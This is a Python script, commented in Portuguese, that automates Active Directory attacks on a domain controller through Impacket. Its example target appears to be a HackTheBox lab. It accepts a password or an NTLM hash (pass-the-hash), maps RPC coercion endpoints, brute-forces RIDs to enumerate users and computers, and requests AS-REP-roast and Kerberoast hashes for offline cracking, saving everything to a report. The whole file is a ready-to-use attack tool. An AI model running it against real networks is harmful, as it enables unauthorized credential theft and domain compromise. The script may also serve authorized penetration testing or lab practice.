#!/usr/bin/env python3
import subprocess
import sys
import argparse
import shlex

def run_cmd(cmd_str, file_handle):
    print(f"\n\033[1;34m[*] Executando:\033[0m {cmd_str}")
    file_handle.write(f"### Comando: `{cmd_str}`\n\n```bash\n")
    file_handle.flush()
    try:
        process = subprocess.Popen(
            cmd_str, shell=True, executable='/bin/bash', 
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
            text=True, bufsize=1
        )
        for line in process.stdout:
            print(line, end="")          
            file_handle.write(line)     
            file_handle.flush()
        process.wait()
    except Exception as e:
        print(f"\033[1;31mERRO: {e}\033[0m")
        file_handle.write(f"ERRO: {e}\n")
    file_handle.write("```\n\n---\n\n")

def main():
    parser = argparse.ArgumentParser(description="Auto-Impacket: Enumeração Máxima de Entrada AD")
    parser.add_argument("target", help="IP do Domain Controller (ex: 10.129.1.114)")
    parser.add_argument("-d", "--domain", required=True, help="Domínio (ex: pirate.htb)")
    parser.add_argument("-u", "--user", required=True, help="Usuário alvo")
    
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("-p", "--password", help="Senha em texto claro")
    auth_group.add_argument("-H", "--hash", help="Hash NTLM (ex: LMHASH:NTHASH ou apenas :NTHASH)")

    args = parser.parse_args()

    # Prepara as strings seguras para o Bash
    safe_target = shlex.quote(args.target)
    safe_domain = shlex.quote(args.domain)
    safe_user = shlex.quote(args.user)

    # Constrói as strings de autenticação específicas do formato do Impacket
    if args.password:
        safe_pass = shlex.quote(args.password)
        auth_target = f"'{safe_domain}/{safe_user}:{safe_pass}@{safe_target}'"
        roast_auth = f"-dc-ip {safe_target} '{safe_domain}/{safe_user}:{safe_pass}'"
    else:
        safe_hash = shlex.quote(args.hash)
        auth_target = f"'{safe_domain}/{safe_user}@{safe_target}' -hashes {safe_hash}"
        roast_auth = f"-dc-ip {safe_target} -hashes {safe_hash} '{safe_domain}/{safe_user}'"

    report_name = f"impacket_enum_{args.target.replace('.', '_')}.md"
    
    with open(report_name, "w") as f:
        f.write(f"# Relatório Auto-Impacket - Alvo: {args.target}\n\n")
        
        # 1. RPCDump: Mapeia endpoints expostos (Busca por MS-RPRN, MS-EFSR)
        print("\033[1;33m[*] Mapeando Endpoints RPC (Coerce Vectors)...\033[0m")
        f.write("## 1. Mapeamento RPC (Vulnerabilidades de Coerção)\n\n")
        cmd_rpcdump = f"impacket-rpcdump {auth_target}"
        run_cmd(cmd_rpcdump, f)

        # 2. LookupSID: Enumera Pre2k Computers, Usuários e Grupos via brute de RID
        print("\033[1;33m[*] Enumerando SIDs (Busca de Pre2k Computers)...\033[0m")
        f.write("## 2. Enumeração de SIDs (Pre-2k Computers & Usuários)\n\n")
        cmd_lookupsid = f"impacket-lookupsid {auth_target}"
        run_cmd(cmd_lookupsid, f)

        # 3. GetNPUsers: ASREPRoasting focado
        print("\033[1;33m[*] Testando ASREPRoasting...\033[0m")
        f.write("## 3. ASREPRoasting\n\n")
        cmd_asrep = f"impacket-GetNPUsers {roast_auth} -request -format hashcat"
        run_cmd(cmd_asrep, f)

        # 4. GetUserSPNs: Kerberoasting focado
        print("\033[1;33m[*] Testando Kerberoasting...\033[0m")
        f.write("## 4. Kerberoasting\n\n")
        cmd_kerb = f"impacket-GetUserSPNs {roast_auth} -request"
        run_cmd(cmd_kerb, f)

    print(f"\n\033[1;32m[+] Enumeração finalizada! Relatório: {report_name}\033[0m")

if __name__ == "__main__":
    main()